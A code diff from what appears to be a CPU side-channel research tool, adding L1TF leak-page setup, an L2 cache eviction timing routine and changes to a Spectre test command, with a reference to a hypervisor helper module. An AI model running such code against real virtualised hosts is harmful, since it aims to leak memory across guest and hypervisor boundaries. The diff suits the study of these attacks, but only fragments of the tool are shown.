@@ -14,6 +14,7 @@
 #include "cache_eviction.h"
 #include "constants.h"
 #include "hypercall.h"
+#include "l1tf.h"
 #include "time_deque.h"
 #include "timing.h"
 
@@ -33,17 +34,27 @@ int hypercall(struct send_ipi_hypercall *opts) {
 }
 
 void determine_cache_eviction(void *leak) {
-  uint64_t variable;
+  build_eviction_sets();
 
-  struct eviction_sets ev = build_eviction_sets();
-  for (size_t i = 0; i < ev.len; ++i) {
-    printf("%p\t", (void *)&variable);
-    maccess(&variable);
-    size_t before = access_time(&variable);
-    evict_set(&ev, i);
-    size_t after = access_time(&variable);
-    printf("B: %ld\tAfter: %ld\t", before, after);
-    printf("cache %p\n", ev.sets[i].ptrs[0]);
+  size_t times[L2_SETS];
+  for (size_t i = 0; i < L2_SETS; ++i) {
+    times[i] = -1;
+  }
+
+  int cached_variable = rand();
+
+  for (size_t iterations = 0; iterations < 1000; ++iterations) {
+    for (size_t l2_set = 0; l2_set < L2_SETS; ++l2_set) {
+      maccess(&cached_variable);
+      lfence();
+      evict_l2(l2_set);
+      size_t after = access_time(&cached_variable);
+      times[l2_set] = times[l2_set] > after ? after : times[l2_set];
+    }
+  }
+
+  for (size_t l2_set = 0; l2_set < L2_SETS; ++l2_set) {
+    printf("%5.ld: %ld\n", l2_set, times[l2_set]);
   }
 
   return;
@@ -198,7 +209,6 @@ void cmd_test_spectre(int argc, char *argv[argc], void *leak_page) {
   printf("Doing %ld iterations\n", iterations);
   for (int set_idx = 0; set_idx < 1; ++set_idx) {
 
-    access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);
     size_t hit = access_buffer_with_spectre(leak_page, min, iterations, set_idx);
     size_t miss = access_buffer_with_spectre(leak_page, ~min, iterations, set_idx);
 
@@ -217,12 +227,7 @@ int main(int argc, char *argv[argc]) {
     err(errno, "Invalid usage");
   }
 
-  // Spawn the leak page
-  void *leak_page = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE,
-                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE, 0, 0);
-  if (leak_page == (void *)-1) {
-    err(errno, "mmap failed");
-  }
+  void *leak_page = l1tf_spawn_leak_page();
 
   // Use this to get physical address of the leak page with the
   // kvm_assist.ko module in the hypervisor
@@ -239,6 +244,6 @@ int main(int argc, char *argv[argc]) {
     determine_cache_eviction(leak_page);
   }
 
-  munmap(leak_page, HUGE_PAGE_SIZE);
+  munmap(leak_page, PAGE_SIZE);
   return 0;
 }
